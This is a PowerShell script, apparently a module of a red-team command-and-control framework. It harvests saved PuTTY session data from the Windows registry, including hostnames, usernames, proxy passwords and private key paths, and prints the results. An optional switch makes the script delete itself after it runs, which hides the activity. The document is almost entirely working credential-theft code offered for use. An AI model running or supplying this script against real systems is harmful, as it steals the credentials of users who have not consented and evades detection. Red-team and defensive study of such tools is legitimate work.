<#
.SYNOPSIS
   Leak PUTTY sessions credentials

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Putty
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.13 that Leaks PUTTY
   sessions credentials,sessions,keys,hostname,proxyname,etc.

.NOTES
   Mitre ATT&CK Ref: T1081 (Credentials in Files)
   
.Parameter AutoDel
   Switch that auto-delete this cmdlet in the end
  
.EXAMPLE
   PS C:\> .\Invoke-PuttyCreds.ps1
   Leak stored Putty sessions creds

.EXAMPLE
   PS C:\> .\Invoke-PuttyCreds.ps1 -autodel
   Leak credentials and delete this cmdlet

.INPUTS
   None. You cannot pipe objects into Invoke-PuttyCreds.ps1

.OUTPUTS
   Putty sessions
   Session Name   : NewSession
   Hostname/IP    : 192.168.1.72
   UserName       : r00t-3xp10it
   Proxy Username : pedroUrubu
   Proxy Password : S3cR3tP4ss
   Private Key    : AAAAB3NzaC1yc2EAAAABJQAAAQBp2eUlwvehXTD3xc7jek3y41n9fO0A
   Proxy Host     : 3xp10it-proxy
   Proxy Port     : 8087
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [switch]$AutoDel
)


$ErrorActionPreference = "SilentlyContinue"
## check for PS version in the event this is invoked from a stand-alone cmdlet
If($PSVersionTable.PSVersion.Major -eq "2")
{
   Write-host "`n   > This function requires PowerShell version greater than 2.0.`n" -ForegroundColor Red
   return
}
Else
{
   $SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name|ForEach-Object{ $_.split("\")[5]}
   If(-not($SavedSessions))
   {
      write-host "`n   > None putty sessions credentials found in $Env:COMPUTERNAME`n" -ForegroundColor Red
      return
   }

   write-host "`n   $Env:COMPUTERNAME Putty sessions" -ForegroundColor Green	
   ForEach($Session in $SavedSessions)
   {
      $HostName = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").Hostname
      $PrivateKey = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").PublicKeyFile
      $Username = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").UserName
      $ProxyHost = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").ProxyHost
      $ProxyPassword = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").ProxyPassword
      $ProxyPort = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").ProxyPort
      $ProxyUsername = (Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session").ProxyUsername

      ## Display leaks
      write-host "`n   Session Name   : $Session"
      write-host "   Hostname/IP    : $HostName"
      write-host "   UserName       : $UserName"
      write-host "   Proxy Username : $ProxyUsername"
      write-host "   Proxy Password : $ProxyPassword"
      write-host "   Private Key    : $PrivateKey"
      write-host "   Proxy Host     : $ProxyHost"
      write-host "   Proxy Port     : $ProxyPort"
   }
}
write-host ""

If($AutoDel.IsPresent)
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}